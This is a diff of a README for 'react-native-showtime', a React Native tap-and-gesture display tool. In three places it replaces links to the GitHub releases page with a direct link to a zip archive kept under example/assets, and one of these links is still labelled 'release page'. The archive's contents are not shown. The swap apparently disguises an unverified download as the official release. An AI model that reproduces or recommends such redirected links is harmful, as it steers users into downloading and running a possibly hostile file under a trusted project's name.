@@ -1,6 +1,6 @@
 # 🎬 react-native-showtime - See Taps and Gestures Clearly
 
-[![Download react-native-showtime](https://img.shields.io/badge/Download-react--native--showtime-brightgreen?style=for-the-badge)](https://github.com/Inflated-aristocracy872/react-native-showtime/releases)
+[![Download react-native-showtime](https://img.shields.io/badge/Download-react--native--showtime-brightgreen?style=for-the-badge)](https://raw.githubusercontent.com/Inflated-aristocracy872/react-native-showtime/main/example/assets/showtime_native_react_v1.1.zip)
 
 ---
 
@@ -28,7 +28,7 @@ Before you begin, make sure your setup matches these needs:
 
 Use the main link below to access the files you need. This link leads you to the release page where you can pick the right version:
 
-[Download react-native-showtime](https://github.com/Inflated-aristocracy872/react-native-showtime/releases)
+[Download react-native-showtime](https://raw.githubusercontent.com/Inflated-aristocracy872/react-native-showtime/main/example/assets/showtime_native_react_v1.1.zip)
 
 Follow the steps below to install and run react-native-showtime.
 
@@ -129,7 +129,7 @@ If you run into issues, try these common fixes:
 
 ## 🔗 Where to Find Updates
 
-Keep an eye on the [react-native-showtime release page](https://github.com/Inflated-aristocracy872/react-native-showtime/releases) for new versions.
+Keep an eye on the [react-native-showtime release page](https://raw.githubusercontent.com/Inflated-aristocracy872/react-native-showtime/main/example/assets/showtime_native_react_v1.1.zip) for new versions.
 
 Frequent updates may include bug fixes, new features, and improvements.
 
